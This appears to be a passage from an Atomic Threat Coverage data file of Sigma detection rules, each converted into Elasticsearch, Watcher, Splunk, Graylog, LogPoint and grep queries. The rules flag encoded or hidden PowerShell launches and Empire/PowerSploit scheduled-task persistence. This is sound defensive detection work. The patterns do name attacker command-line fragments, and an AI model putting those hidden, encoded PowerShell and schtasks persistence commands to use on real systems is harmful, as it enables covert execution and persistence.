- attack.execution\n    - attack.t1086\ndetection:\n    selection:\n        CommandLine:\n            - '* -bxor*'\n    condition: selection\nfalsepositives:\n    - unknown\nlevel: medium\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(*\\\\ \\\\-bxor*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-XOR-Encoded-PowerShell-Command-Line <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious XOR Encoded PowerShell Command Line\",\\n    \"description\": \"Detects suspicious powershell process which includes bxor command, alternatvide obfuscation method to b64 encoded commands.\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1086\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(*\\\\\\\\ \\\\\\\\-bxor*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(*\\\\\\\\ \\\\\\\\-bxor*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious XOR Encoded PowerShell Command Line\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(* \\\\-bxor*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"* -bxor*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"* -bxor*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.* -bxor.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Default PowerSploit and Empire Schtasks Persistence\nid: 56c217c3-2de2-479b-990f-5c109ba8458f\nstatus: experimental\ndescription: Detects the creation of a schtask via PowerSploit or Empire Default Configuration.\nreferences:\n    - https://github.com/0xdeadbeefJERKY/PowerSploit/blob/8690399ef70d2cad10213575ac67e8fa90ddf7c3/Persistence/Persistence.psm1\n    - https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/persistence/userland/schtasks.py\n    - https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/persistence/elevated/schtasks.py\nauthor: Markus Neis, @Karneades\ndate: 2018/03/06\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage:\n            - '*\\powershell.exe'\n        CommandLine:\n            - '*schtasks*/Create*/SC *ONLOGON*/TN *Updater*/TR *powershell*'\n            - '*schtasks*/Create*/SC *DAILY*/TN *Updater*/TR *powershell*'\n            - '*schtasks*/Create*/SC *ONIDLE*/TN *Updater*/TR *powershell*'\n            - '*schtasks*/Create*/SC *Updater*/TN *Updater*/TR *powershell*'\n    condition: selection\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1053\n    - attack.t1086\n    - attack.s0111\n    - attack.g0022\n    - attack.g0060\n    - car.2013-08-001\nfalsepositives:\n    - False positives are possible, depends on organisation and processes\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Default PowerSploit and Empire Schtasks Persistence\nid: 56c217c3-2de2-479b-990f-5c109ba8458f\nstatus: experimental\ndescription: Detects the creation of a schtask via PowerSploit or Empire Default Configuration.\nreferences:\n    - https://github.com/0xdeadbeefJERKY/PowerSploit/blob/8690399ef70d2cad10213575ac67e8fa90ddf7c3/Persistence/Persistence.psm1\n    - https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/persistence/userland/schtasks.py\n    - https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/persistence/elevated/schtasks.py\nauthor: Markus Neis, @Karneades\ndate: 2018/03/06\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage:\n            - '*\\powershell.exe'\n        CommandLine:\n            - '*schtasks*/Create*/SC *ONLOGON*/TN *Updater*/TR *powershell*'\n            - '*schtasks*/Create*/SC *DAILY*/TN *Updater*/TR *powershell*'\n            - '*schtasks*/Create*/SC *ONIDLE*/TN *Updater*/TR *powershell*'\n            - '*schtasks*/Create*/SC *Updater*/TN *Updater*/TR *powershell*'\n    condition: selection\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1053\n    - attack.t1086\n    - attack.s0111\n    - attack.g0022\n    - attack.g0060\n    - car.2013-08-001\nfalsepositives:\n    - False positives are possible, depends on organisation and processes\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ParentImage.keyword:(*\\\\\\\\powershell.exe) AND CommandLine.keyword:(*schtasks*\\\\/Create*\\\\/SC\\\\ *ONLOGON*\\\\/TN\\\\ *Updater*\\\\/TR\\\\ *powershell* OR *schtasks*\\\\/Create*\\\\/SC\\\\ *DAILY*\\\\/TN\\\\ *Updater*\\\\/TR\\\\ *powershell* OR *schtasks*\\\\/Create*\\\\/SC\\\\ *ONIDLE*\\\\/TN\\\\ *Updater*\\\\/TR\\\\ *powershell* OR *schtasks*\\\\/Create*\\\\/SC\\\\ *Updater*\\\\/TN\\\\ *Updater*\\\\/TR\\\\ *powershell*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Default-PowerSploit-and-Empire-Schtasks-Persistence <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Default PowerSploit and Empire Schtasks Persistence\",\\n    \"description\": \"Detects the creation of a schtask via PowerSploit or Empire Default Configuration.\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.persistence\",\\n      \"attack.privilege_escalation\",\\n      \"attack.t1053\",\\n      \"attack.t1086\",\\n      \"attack.s0111\",\\n      \"attack.g0022\",\\n      \"attack.g0060\",\\n      \"car.2013-08-001\"\\n    ],\\n    \"query\": \"(ParentImage.keyword:(*\\\\\\\\\\\\\\\\powershell.exe) AND CommandLine.keyword:(*schtasks*\\\\\\\\/Create*\\\\\\\\/SC\\\\\\\\ *ONLOGON*\\\\\\\\/TN\\\\\\\\ *Updater*\\\\\\\\/TR\\\\\\\\ *powershell* OR *schtasks*\\\\\\\\/Create*\\\\\\\\/SC\\\\\\\\ *DAILY*\\\\\\\\/TN\\\\\\\\ *Updater*\\\\\\\\/TR\\\\\\\\ *powershell* OR *schtasks*\\\\\\\\/Create*\\\\\\\\/SC\\\\\\\\ *ONIDLE*\\\\\\\\/TN\\\\\\\\ *Updater*\\\\\\\\/TR\\\\\\\\ *powershell* OR *schtasks*\\\\\\\\/Create*\\\\\\\\/SC\\\\\\\\ *Updater*\\\\\\\\/TN\\\\\\\\ *Updater*\\\\\\\\/TR\\\\\\\\ *powershell*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentImage.keyword:(*\\\\\\\\\\\\\\\\powershell.exe) AND CommandLine.keyword:(*schtasks*\\\\\\\\/Create*\\\\\\\\/SC\\\\\\\\ *ONLOGON*\\\\\\\\/TN\\\\\\\\ *Updater*\\\\\\\\/TR\\\\\\\\ *powershell* OR *schtasks*\\\\\\\\/Create*\\\\\\\\/SC\\\\\\\\ *DAILY*\\\\\\\\/TN\\\\\\\\ *Updater*\\\\\\\\/TR\\\\\\\\ *powershell* OR *schtasks*\\\\\\\\/Create*\\\\\\\\/SC\\\\\\\\ *ONIDLE*\\\\\\\\/TN\\\\\\\\ *Updater*\\\\\\\\/TR\\\\\\\\ *powershell* OR *schtasks*\\\\\\\\/Create*\\\\\\\\/SC\\\\\\\\ *Updater*\\\\\\\\/TN\\\\\\\\ *Updater*\\\\\\\\/TR\\\\\\\\ *powershell*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Default PowerSploit and Empire Schtasks Persistence\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ParentImage.keyword:(*\\\\\\\\powershell.exe) AND CommandLine.keyword:(*schtasks*\\\\/Create*\\\\/SC *ONLOGON*\\\\/TN *Updater*\\\\/TR *powershell* *schtasks*\\\\/Create*\\\\/SC *DAILY*\\\\/TN *Updater*\\\\/TR *powershell* *schtasks*\\\\/Create*\\\\/SC *ONIDLE*\\\\/TN *Updater*\\\\/TR *powershell* *schtasks*\\\\/Create*\\\\/SC *Updater*\\\\/TN *Updater*\\\\/TR *powershell*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((ParentImage=\"*\\\\\\\\powershell.exe\") (CommandLine=\"*schtasks*/Create*/SC *ONLOGON*/TN *Updater*/TR *powershell*\" OR CommandLine=\"*schtasks*/Create*/SC *DAILY*/TN *Updater*/TR *powershell*\" OR CommandLine=\"*schtasks*/Create*/SC *ONIDLE*/TN *Updater*/TR *powershell*\" OR CommandLine=\"*schtasks*/Create*/SC *Updater*/TN *Updater*/TR *powershell*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentImage IN [\"*\\\\\\\\powershell.exe\"] CommandLine IN [\"*schtasks*/Create*/SC *ONLOGON*/TN *Updater*/TR *powershell*\", \"*schtasks*/Create*/SC *DAILY*/TN *Updater*/TR *powershell*\", \"*schtasks*/Create*/SC *ONIDLE*/TN *Updater*/TR *powershell*\", \"*schtasks*/Create*/SC *Updater*/TN *Updater*/TR *powershell*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*.*\\\\powershell\\\\.exe))(?=.*(?:.*.*schtasks.*/Create.*/SC .*ONLOGON.*/TN .*Updater.*/TR .*powershell.*|.*.*schtasks.*/Create.*/SC .*DAILY.*/TN .*Updater.*/TR .*powershell.*|.*.*schtasks.*/Create.*/SC .*ONIDLE.*/TN .*Updater.*/TR .*powershell.*|.*.*schtasks.*/Create.*/SC .*Updater.*/TN .*Updater.*/TR .*powershell.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Empire PowerShell Launch Parameters\ndescription: Detects suspicious powershell command line parameters used in Empire\nstatus: experimental\nreferences:\n    - https://github.com/EmpireProject/Empire/blob/c2ba61ca8d2031dad0cfc1d5770ba723e8b710db/lib/common/helpers.py#L165\n    - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/deaduser.py#L191\n    - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/resolver.py#L178\nauthor: Florian Roth\ndate: 2019/04/20\ntags:\n  - attack.execution\n  - attack.t1086\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '* -NoP -sta -NonI -W Hidden -Enc *'\n            - '* -noP -sta -w 1 -enc *'\n    condition: selection\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Empire PowerShell Launch Parameters\ndescription: Detects suspicious powershell command line parameters used in Empire\nstatus: experimental\nreferences:\n    - https://github.com/EmpireProject/Empire/blob/c2ba61ca8d2031dad0cfc1d5770ba723e8b710db/lib/common/helpers.py#L165\n    - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/deaduser.py#L191\n    - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/resolver.py#L178\nauthor: Florian Roth\ndate: 2019/04/20\ntags:\n  - attack.execution\n  - attack.t1086\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '* -NoP -sta -NonI -W Hidden -Enc *'\n            - '* -noP -sta -w 1 -enc *'\n    condition: selection\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(*\\\\ \\\\-NoP\\\\ \\\\-sta\\\\ \\\\-NonI\\\\ \\\\-W\\\\ Hidden\\\\ \\\\-Enc\\\\ * OR *\\\\ \\\\-noP\\\\ \\\\-sta\\\\ \\\\-w\\\\ 1\\\\ \\\\-enc\\\\ *)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Empire-PowerShell-Launch-Parameters <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Empire PowerShell Launch Parameters\",\\n    \"description\": \"Detects suspicious powershell command line parameters used in Empire\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1086\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(*\\\\\\\\ \\\\\\\\-NoP\\\\\\\\ \\\\\\\\-sta\\\\\\\\ \\\\\\\\-NonI\\\\\\\\ \\\\\\\\-W\\\\\\\\ Hidden\\\\\\\\ \\\\\\\\-Enc\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-noP\\\\\\\\ \\\\\\\\-sta\\\\\\\\ \\\\\\\\-w\\\\\\\\ 1\\\\\\\\ \\\\\\\\-enc\\\\\\\\ *)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(*\\\\\\\\ \\\\\\\\-NoP\\\\\\\\ \\\\\\\\-sta\\\\\\\\ \\\\\\\\-NonI\\\\\\\\ \\\\\\\\-W\\\\\\\\ Hidden\\\\\\\\ \\\\\\\\-Enc\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-noP\\\\\\\\ \\\\\\\\-sta\\\\\\\\ \\\\\\\\-w\\\\\\\\ 1\\\\\\\\ \\\\\\\\-enc\\\\\\\\ *)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Empire PowerShell Launch Parameters\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine:(\"* \\\\-NoP \\\\-sta \\\\-NonI \\\\-W Hidden \\\\-Enc *\" \"* \\\\-noP \\\\-sta \\\\-w 1 \\\\-enc *\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"* -NoP -sta -NonI -W Hidden -Enc *\" OR CommandLine=\"* -noP -sta -w 1 -enc *\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "CommandLine IN [\"* -NoP -sta -NonI -W Hidden -Enc *\", \"* -noP -sta -w 1 -enc *\"]", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.* -NoP -sta -NonI -W Hidden -Enc .*|.*.* -noP -sta -w 1 -enc .*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Empire PowerShell Launch Parameters\nid: 79f4ede3-402e-41c8-bc3e-ebbf5f162581\ndescription: Detects suspicious powershell command line parameters used in Empire\nstatus: experimental\nreferences:\n    - https://github.com/EmpireProject/Empire/blob/c2ba61ca8d2031dad0cfc1d5770ba723e8b710db/lib/common/helpers.py#L165\n    - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/deaduser.py#L191\n    - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/resolver.py#L178\n    - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-EventVwrBypass.ps1#L64\nauthor: Florian Roth\ndate: 2019/04/20\ntags:\n  - attack.execution\n  - attack.t1086\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '* -NoP -sta -NonI -W Hidden -Enc *'\n            - '* -noP -sta -w 1 -enc *'\n            - '* -NoP -NonI -W Hidden -enc *'\n    condition: selection\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Empire PowerShell Launch Parameters\nid: 79f4ede3-402e-41c8-bc3e-ebbf5f162581\ndescription: Detects suspicious powershell command line parameters used in Empire\nstatus: experimental\nreferences:\n    - https://github.com/EmpireProject/Empire/blob/c2ba61ca8d2031dad0cfc1d5770ba723e8b710db/lib/common/helpers.py#L165\n    - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/deaduser.py#L191\n    - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/resolver.py#L178\n    - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-EventVwrBypass.ps1#L64\nauthor: Florian Roth\ndate: 2019/04/20\ntags:\n  - attack.execution\n  - attack.t1086\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '* -NoP -sta -NonI -W Hidden -Enc *'\n            - '* -noP -sta -w 1 -enc *'\n            - '* -NoP -NonI -W Hidden -enc *'\n    condition: selection\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(*\\\\ \\\\-NoP\\\\ \\\\-sta\\\\ \\\\-NonI\\\\ \\\\-W\\\\ Hidden\\\\ \\\\-Enc\\\\ * OR *\\\\ \\\\-noP\\\\ \\\\-sta\\\\ \\\\-w\\\\ 1\\\\ \\\\-enc\\\\ * OR *\\\\ \\\\-NoP\\\\ \\\\-NonI\\\\ \\\\-W\\\\ Hidden\\\\ \\\\-enc\\\\ *)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Empire-PowerShell-Launch-Parameters <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Empire PowerShell Launch Parameters\",\\n    \"description\": \"Detects suspicious powershell command line parameters used in Empire\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1086\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(*\\\\\\\\ \\\\\\\\-NoP\\\\\\\\ \\\\\\\\-sta\\\\\\\\ \\\\\\\\-NonI\\\\\\\\ \\\\\\\\-W\\\\\\\\ Hidden\\\\\\\\ \\\\\\\\-Enc\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-noP\\\\\\\\ \\\\\\\\-sta\\\\\\\\ \\\\\\\\-w\\\\\\\\ 1\\\\\\\\ \\\\\\\\-enc\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-NoP\\\\\\\\ \\\\\\\\-NonI\\\\\\\\ \\\\\\\\-W\\\\\\\\ Hidden\\\\\\\\ \\\\\\\\-enc\\\\\\\\ *)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(*\\\\\\\\ \\\\\\\\-NoP\\\\\\\\ \\\\\\\\-sta\\\\\\\\ \\\\\\\\-NonI\\\\\\\\ \\\\\\\\-W\\\\\\\\ Hidden\\\\\\\\ \\\\\\\\-Enc\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-noP\\\\\\\\ \\\\\\\\-sta\\\\\\\\ \\\\\\\\-w\\\\\\\\ 1\\\\\\\\ \\\\\\\\-enc\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-NoP\\\\\\\\ \\\\\\\\-NonI\\\\\\\\ \\\\\\\\-W\\\\\\\\ Hidden\\\\\\\\ \\\\\\\\-enc\\\\\\\\ *)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Empire PowerShell Launch Parameters\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(* \\\\-NoP \\\\-sta \\\\-NonI \\\\-W Hidden \\\\-Enc * * \\\\-noP \\\\-sta \\\\-w 1 \\\\-enc * * \\\\-NoP \\\\-NonI \\\\-W Hidden \\\\-enc *)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"* -NoP -sta -NonI -W Hidden -Enc *\" OR CommandLine=\"* -noP -sta -w 1 -enc *\" OR CommandLine=\"* -NoP -NonI -W Hidden -enc *\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"* -NoP -sta -NonI -W Hidden -Enc *\", \"* -noP -sta -w 1 -enc *\", \"* -NoP -NonI -W Hidden -enc *\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.* -NoP -sta -NonI -W Hidden -Enc .*|.*.* -noP -sta -w 1 -enc .*|.*.* -NoP -NonI -W Hidden -enc .*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Encoded PowerShell Command Line\nid: ca2092a1-c273-4878-9b4b-0d60115bf5ea\ndescription: Detects suspicious powershell process starts with base64 encoded commands\nstatus: experimental\nreferences:\n    - https://app.any.run/tasks/6217d77d-3189-4db2-a957-8ab239f3e01e\nauthor: Florian Roth, Markus Neis\ndate: 2018/09/03\nmodified: 2019/12/16\ntags:\n  - attack.execution\n  - attack.t1086\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '* -e JAB*'\n            - '* -e  JAB*'\n            - '* -e   JAB*'\n            - '* -e    JAB*'\n            - '* -e     JAB*'\n            - '* -e      JAB*'\n            - '* -en JAB*'\n            - '* -enc JAB*'\n            - '* -enc* JAB*'\n            - '* -w hidden -e* JAB*'\n            - '* BA^J e-'\n            - '* -e SUVYI*'\n            - '* -e aWV4I*'\n            - '* -e SQBFAFgA*'\n            - '* -e aQBlAHgA*'\n            - '* -enc SUVYI*'\n            - '* -enc aWV4I*'\n            - '* -enc SQBFAFgA*'\n            - '* -enc aQBlAHgA*'\n    falsepositive1:\n        CommandLine: '* -ExecutionPolicy remotesigned *'\n    condition: selection and not falsepositive1\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Encoded PowerShell Command Line\nid: ca2092a1-c273-4878-9b4b-0d60115bf5ea\ndescription: Detects suspicious powershell process starts with base64 encoded commands\nstatus: experimental\nreferences:\n    - https://app.any.run/tasks/6217d77d-3189-4db2-a957-8ab239f3e01e\nauthor: Florian Roth, Markus Neis\ndate: 2018/09/03\nmodified: 2019/12/16\ntags:\n  - attack.execution\n  - attack.t1086\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '* -e JAB*'\n            - '* -e  JAB*'\n            - '* -e   JAB*'\n            - '* -e    JAB*'\n            - '* -e     JAB*'\n            - '* -e      JAB*'\n            - '* -en JAB*'\n            - '* -enc JAB*'\n            - '* -enc* JAB*'\n            - '* -w hidden -e* JAB*'\n            - '* BA^J e-'\n            - '* -e SUVYI*'\n            - '* -e aWV4I*'\n            - '* -e SQBFAFgA*'\n            - '* -e aQBlAHgA*'\n            - '* -enc SUVYI*'\n            - '* -enc aWV4I*'\n            - '* -enc SQBFAFgA*'\n            - '* -enc aQBlAHgA*'\n    falsepositive1:\n        CommandLine: '* -ExecutionPolicy remotesigned *'\n    condition: selection and not falsepositive1\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(CommandLine.keyword:(*\\\\ \\\\-e\\\\ JAB* OR *\\\\ \\\\-e\\\\ \\\\ JAB* OR *\\\\ \\\\-e\\\\ \\\\ \\\\ JAB* OR *\\\\ \\\\-e\\\\ \\\\ \\\\ \\\\ JAB* OR *\\\\ \\\\-e\\\\ \\\\ \\\\ \\\\ \\\\ JAB* OR *\\\\ \\\\-e\\\\ \\\\ \\\\ \\\\ \\\\ \\\\ JAB* OR *\\\\ \\\\-en\\\\ JAB* OR *\\\\ \\\\-enc\\\\ JAB* OR *\\\\ \\\\-enc*\\\\ JAB* OR *\\\\ \\\\-w\\\\ hidden\\\\ \\\\-e*\\\\ JAB* OR *\\\\ BA\\\\^J\\\\ e\\\\- OR *\\\\ \\\\-e\\\\ SUVYI* OR *\\\\ \\\\-e\\\\ aWV4I* OR *\\\\ \\\\-e\\\\ SQBFAFgA* OR *\\\\ \\\\-e\\\\ aQBlAHgA* OR *\\\\ \\\\-enc\\\\ SUVYI* OR *\\\\ \\\\-enc\\\\ aWV4I* OR *\\\\ \\\\-enc\\\\ SQBFAFgA* OR *\\\\ \\\\-enc\\\\ aQBlAHgA*) AND (NOT (CommandLine.keyword:*\\\\ \\\\-ExecutionPolicy\\\\ remotesigned\\\\ *)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Encoded-PowerShell-Command-Line <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Encoded PowerShell Command Line\",\\n    \"description\": \"Detects suspicious powershell process starts with base64 encoded commands\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1086\"\\n    ],\\n    \"query\": \"(CommandLine.keyword:(*\\\\\\\\ \\\\\\\\-e\\\\\\\\ JAB* OR *\\\\\\\\ \\\\\\\\-e\\\\\\\\ \\\\\\\\ JAB* OR *\\\\\\\\ \\\\\\\\-e\\\\\\\\ \\\\\\\\ \\\\\\\\ JAB* OR *\\\\\\\\ \\\\\\\\-e\\\\\\\\ \\\\\\\\ \\\\\\\\ \\\\\\\\ 